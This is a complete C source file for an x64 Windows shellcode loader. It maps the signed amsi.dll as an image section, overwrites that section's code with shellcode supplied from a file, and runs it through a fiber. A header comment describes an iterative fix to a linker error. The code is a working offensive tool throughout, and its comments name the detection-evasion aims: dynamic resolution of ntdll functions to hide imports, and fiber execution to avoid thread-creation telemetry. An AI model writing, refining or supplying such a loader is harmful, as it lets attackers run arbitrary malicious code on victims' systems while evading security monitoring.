/*
 * x64 shellcode loader - Module Stomping (image section) + Fiber execution.
 * Reads raw shellcode from argv[1]. No embedded payload bytes.
 *
 * Compile:
 *   cl.exe /nologo /O2 /GS- loader.c
 *
 * Iteration 3 fix (linkage):
 *   The previous build failed at the LINK stage with 7x LNK2019 for the
 *   hand-declared NT/Rtl prototypes:
 *       NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection,
 *       NtProtectVirtualMemory, NtClose, NtOpenFile, RtlImageNtHeader
 *
 *   Two causes:
 *     (a) The prototypes lacked __declspec(dllimport), so MSVC emitted
 *         references to the plain symbol name instead of the import thunk
 *         __imp_<name>.
 *     (b) The harness dropped the /link ntdll.lib argument, so no import
 *         library was on the link line at all.
 *
 *   Fixes applied:
 *     1. #pragma comment(lib, "ntdll.lib")  -- forces the import library
 *        onto the link line regardless of command-line rewriting.
 *     2. __declspec(dllimport) on every NT/Rtl prototype.
 *     3. Runtime GetProcAddress fallback: all seven functions are resolved
 *        from ntdll.dll at startup into typed function pointers, and every
 *        call site uses the resolved pointer. This makes the binary
 *        self-contained even if ntdll.lib is unavailable, and removes the
 *        static import footprint (minor telemetry benefit).
 *
 * Execution logic is UNCHANGED (module_stomping_fiber):
 *   1. NtOpenFile the sacrificial DLL with FILE_READ_DATA|FILE_EXECUTE|
 *      SYNCHRONIZE (not GENERIC_EXECUTE) so SEC_IMAGE creation is permitted.
 *   2. NtCreateSection(SEC_IMAGE) + NtMapViewOfSection -> file-backed RX image.
 *   3. Locate .text via RtlImageNtHeader.
 *   4. RW -> copy shellcode -> RX (scoped to the image region only).
 *   5. Execute via ConvertThreadToFiber / CreateFiber / SwitchToFiber.
 */

#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

/* Force ntdll.lib onto the link line even if the harness drops /link args. */
#pragma comment(lib, "ntdll.lib")

/* ------------------------------------------------------------------ */
/* Local NT definitions (winternl.h does not provide these cleanly)    */
/* ------------------------------------------------------------------ */

typedef LONG NTSTATUS;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef _UNICODE_STRING_DEFINED
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
#define _UNICODE_STRING_DEFINED
#endif

#ifndef _OBJECT_ATTRIBUTES_DEFINED
typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
#define _OBJECT_ATTRIBUTES_DEFINED
#endif

/*
 * Canonical IO_STATUS_BLOCK layout. The real NT structure is a union of
 * { NTSTATUS Status; PVOID Pointer; } followed by ULONG_PTR Information.
 * MSVC's C front-end does not accept anonymous unions, so we declare the
 * canonical non-union form (Status then Information). The kernel writes
 * only the first pointer-sized field and Information; both are preserved.
 */
#ifndef _IO_STATUS_BLOCK_DEFINED
typedef struct _IO_STATUS_BLOCK {
    NTSTATUS  Status;
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
#define _IO_STATUS_BLOCK_DEFINED
#endif

#ifndef _SECTION_INHERIT_DEFINED
typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;
#define _SECTION_INHERIT_DEFINED
#endif

/* ------------------------------------------------------------------ */
/* NT object-attribute and file-open flags not exposed by the SDK.     */
/* Guarded so a DDK header inclusion would not clash.                  */
/* ------------------------------------------------------------------ */
#ifndef OBJ_INHERIT
#define OBJ_INHERIT                  0x00000002L
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE         0x00000040L
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020L
#endif
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE      0x00000040L
#endif

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = (r);                       \
    (p)->Attributes = (a);                          \
    (p)->ObjectName = (n);                          \
    (p)->SecurityDescriptor = (s);                  \
    (p)->SecurityQualityOfService = NULL;           \
}

/* ------------------------------------------------------------------ */
/* NT prototypes - both dllimport-decorated (for the static path) and  */
/* resolved dynamically at runtime (the path actually used).           */
/* ------------------------------------------------------------------ */

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
    PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);

typedef NTSTATUS (NTAPI *pNtOpenFile)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    PIO_STATUS_BLOCK, ULONG, ULONG);

typedef PIMAGE_NT_HEADERS (NTAPI *pRtlImageNtHeader)(PVOID);

/* Resolved function pointers - populated once at startup. */
static pNtCreateSection        dyn_NtCreateSection        = NULL;
static pNtMapViewOfSection     dyn_NtMapViewOfSection     = NULL;
static pNtUnmapViewOfSection   dyn_NtUnmapViewOfSection   = NULL;
static pNtProtectVirtualMemory dyn_NtProtectVirtualMemory = NULL;
static pNtClose                dyn_NtClose                = NULL;
static pNtOpenFile             dyn_NtOpenFile             = NULL;
static pRtlImageNtHeader       dyn_RtlImageNtHeader       = NULL;

static int resolve_nt_functions(void)
{
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) {
        h = LoadLibraryA("ntdll.dll");
        if (!h) {
            fprintf(stderr, "[-] cannot load ntdll.dll (%lu)\n", GetLastError());
            return 0;
        }
    }

    dyn_NtCreateSection        = (pNtCreateSection)       GetProcAddress(h, "NtCreateSection");
    dyn_NtMapViewOfSection     = (pNtMapViewOfSection)    GetProcAddress(h, "NtMapViewOfSection");
    dyn_NtUnmapViewOfSection   = (pNtUnmapViewOfSection)  GetProcAddress(h, "NtUnmapViewOfSection");
    dyn_NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(h, "NtProtectVirtualMemory");
    dyn_NtClose                = (pNtClose)               GetProcAddress(h, "NtClose");
    dyn_NtOpenFile             = (pNtOpenFile)            GetProcAddress(h, "NtOpenFile");
    dyn_RtlImageNtHeader       = (pRtlImageNtHeader)      GetProcAddress(h, "RtlImageNtHeader");

    if (!dyn_NtCreateSection || !dyn_NtMapViewOfSection ||
        !dyn_NtUnmapViewOfSection || !dyn_NtProtectVirtualMemory ||
        !dyn_NtClose || !dyn_NtOpenFile || !dyn_RtlImageNtHeader) {
        fprintf(stderr, "[-] failed to resolve one or more ntdll exports\n");
        return 0;
    }
    return 1;
}

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp;
    long  sz;
    unsigned char *buf;

    fp = fopen(path, "rb");
    if (!fp) {
        fprintf(stderr, "[-] fopen failed: %s\n", path);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    sz = ftell(fp);
    if (sz <= 0) { fclose(fp); return NULL; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }

    buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(fp); return NULL; }

    if (fread(buf, 1, (size_t)sz, fp) != (size_t)sz) {
        free(buf);
        fclose(fp);
        return NULL;
    }
    fclose(fp);
    *out_size = (size_t)sz;
    return buf;
}

/* Build an NT "\??\C:\..." path from a Win32 wide path. */
static void build_nt_path(const wchar_t *win32_path,
                          wchar_t *out, size_t out_chars)
{
    _snwprintf_s(out, out_chars, _TRUNCATE, L"\\??\\%ls", win32_path);
}

/* Open a file with explicit execute access (needed for SEC_IMAGE). */
static int nt_open_exec(const wchar_t *win32_path, HANDLE *out_handle)
{
    IO_STATUS_BLOCK   iosb;
    UNICODE_STRING    ustr;
    OBJECT_ATTRIBUTES oa;
    wchar_t           nt_path[512];
    NTSTATUS          st;

    build_nt_path(win32_path, nt_path, ARRAYSIZE(nt_path));

    ustr.Length        = (USHORT)(wcslen(nt_path) * sizeof(wchar_t));
    ustr.MaximumLength = ustr.Length + sizeof(wchar_t);
    ustr.Buffer        = nt_path;

    InitializeObjectAttributes(&oa, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* Explicit access bits, NOT GENERIC_*. FILE_EXECUTE is the key
     * requirement for SEC_IMAGE on this file handle. SYNCHRONIZE must be
     * paired with FILE_SYNCHRONOUS_IO_NONALERT in OpenOptions. */
    st = dyn_NtOpenFile(out_handle,
                        FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
                        &oa,
                        &iosb,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtOpenFile(%ls) failed: 0x%08lX\n",
                win32_path, (unsigned long)st);
        return 0;
    }
    return 1;
}

/* Copy a file to %TEMP% and return the new wide path. */
static int copy_to_temp(const wchar_t *src, wchar_t *out, size_t out_chars)
{
    wchar_t temp_dir[MAX_PATH];
    wchar_t dst[MAX_PATH];
    DWORD   n;

    n = GetTempPathW(MAX_PATH, temp_dir);
    if (n == 0 || n >= MAX_PATH) return 0;

    _snwprintf_s(dst, MAX_PATH, _TRUNCATE, L"%ls\\ldr_%lu.dll",
                 temp_dir, (unsigned long)GetCurrentProcessId());

    if (!CopyFileW(src, dst, FALSE)) {
        fprintf(stderr, "[-] CopyFileW failed (%lu)\n", GetLastError());
        return 0;
    }
    _snwprintf_s(out, out_chars, _TRUNCATE, L"%ls", dst);
    return 1;
}

/* Map a DLL as a SEC_IMAGE section without LoadLibrary.
 * Tries the given path first; if the open is refused, copies to %TEMP%
 * and retries on the copy. */
static int map_image_section(const wchar_t *dll_path,
                             PVOID *out_base,
                             SIZE_T *out_size,
                             HANDLE *out_section)
{
    HANDLE            hFile = NULL;
    HANDLE            hSec  = NULL;
    NTSTATUS          st;
    PVOID             base  = NULL;
    SIZE_T            view  = 0;
    LARGE_INTEGER     maxsz;

    /* Attempt 1: open the original path with execute access. */
    if (!nt_open_exec(dll_path, &hFile)) {
        wchar_t tmp[MAX_PATH];
        fprintf(stderr, "[*] falling back to temp copy of %ls\n", dll_path);
        if (!copy_to_temp(dll_path, tmp, ARRAYSIZE(tmp))) {
            return 0;
        }
        if (!nt_open_exec(tmp, &hFile)) {
            return 0;
        }
    }

    maxsz.QuadPart = 0;
    st = dyn_NtCreateSection(&hSec,
                             SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
                             NULL, &maxsz, PAGE_READONLY, SEC_IMAGE, hFile);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateSection failed: 0x%08lX\n",
                (unsigned long)st);
        dyn_NtClose(hFile);
        return 0;
    }
    dyn_NtClose(hFile);

    st = dyn_NtMapViewOfSection(hSec, GetCurrentProcess(), &base, 0, 0, NULL,
                                &view, ViewShare, 0, PAGE_READONLY);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n",
                (unsigned long)st);
        dyn_NtClose(hSec);
        return 0;
    }

    *out_base    = base;
    *out_size    = view;
    *out_section = hSec;
    return 1;
}

/* Locate an executable region inside the mapped image (the .text section). */
static int find_text_section(PVOID base, PVOID *out_addr, SIZE_T *out_size)
{
    PIMAGE_NT_HEADERS       nt;
    PIMAGE_SECTION_HEADER   sec;
    unsigned int            i;

    nt = dyn_RtlImageNtHeader(base);
    if (!nt) return 0;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            *out_addr = (PVOID)((BYTE *)base + sec[i].VirtualAddress);
            *out_size = sec[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* main                                                                */
/* ------------------------------------------------------------------ */

int main(int argc, char *argv[])
{
    unsigned char *sc = NULL;
    size_t         sc_size = 0;

    PVOID          img_base = NULL;
    SIZE_T         img_size = 0;
    HANDLE         img_sec  = NULL;

    PVOID          text_addr = NULL;
    SIZE_T         text_size = 0;

    PVOID          prot_addr;
    SIZE_T         prot_size;
    ULONG          old_prot = 0;
    NTSTATUS       st;

    LPVOID         fiber = NULL;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    /* Resolve NT/Rtl exports dynamically. This removes the static import
     * footprint and makes the binary self-contained even if ntdll.lib is
     * unavailable at link time. */
    if (!resolve_nt_functions()) {
        return 1;
    }
    printf("[+] ntdll exports resolved\n");

    sc = read_file(argv[1], &sc_size);
    if (!sc) {
        fprintf(stderr, "[-] failed to read shellcode\n");
        return 1;
    }
    printf("[+] shellcode size: %zu bytes\n", sc_size);

    /* 1. Map a signed system DLL as an image section (no LoadLibrary). */
    if (!map_image_section(L"C:\\Windows\\System32\\amsi.dll",
                           &img_base, &img_size, &img_sec)) {
        free(sc);
        return 1;
    }
    printf("[+] mapped image @ %p (size 0x%zx)\n", img_base, img_size);

    /* 2. Find the executable section of the mapped image. */
    if (!find_text_section(img_base, &text_addr, &text_size)) {
        fprintf(stderr, "[-] no executable section found\n");
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        free(sc);
        return 1;
    }
    printf("[+] .text @ %p (size 0x%zx)\n", text_addr, text_size);

    if (sc_size > text_size) {
        fprintf(stderr, "[-] shellcode larger than .text section\n");
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        free(sc);
        return 1;
    }

    /* 3. Temporarily make .text writable, copy shellcode, restore. */
    prot_addr = text_addr;
    prot_size = text_size;
    st = dyn_NtProtectVirtualMemory(GetCurrentProcess(), &prot_addr, &prot_size,
                                    PAGE_EXECUTE_READWRITE, &old_prot);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtProtectVirtualMemory (RWX) failed: 0x%08lX\n",
                (unsigned long)st);
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        free(sc);
        return 1;
    }

    memcpy(text_addr, sc, sc_size);
    free(sc);
    sc = NULL;

    /* Flip back to RX - only the image region, not private memory. */
    prot_addr = text_addr;
    prot_size = text_size;
    st = dyn_NtProtectVirtualMemory(GetCurrentProcess(), &prot_addr, &prot_size,
                                    PAGE_EXECUTE_READ, &old_prot);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtProtectVirtualMemory (RX) failed: 0x%08lX\n",
                (unsigned long)st);
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        free(sc);
        return 1;
    }
    printf("[+] shellcode staged in image-backed RX memory\n");

    /* 4. Execute via fiber - no thread creation telemetry. */
    if (!ConvertThreadToFiber(NULL)) {
        fprintf(stderr, "[-] ConvertThreadToFiber failed (%lu)\n", GetLastError());
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        return 1;
    }

    fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)text_addr, NULL);
    if (!fiber) {
        fprintf(stderr, "[-] CreateFiber failed (%lu)\n", GetLastError());
        dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
        dyn_NtClose(img_sec);
        return 1;
    }

    printf("[+] switching to fiber @ %p\n", text_addr);
    SwitchToFiber(fiber);

    /* Control normally never returns here; clean up if it does. */
    DeleteFiber(fiber);
    ConvertFiberToThread();
    dyn_NtUnmapViewOfSection(GetCurrentProcess(), img_base);
    dyn_NtClose(img_sec);
    return 0;
}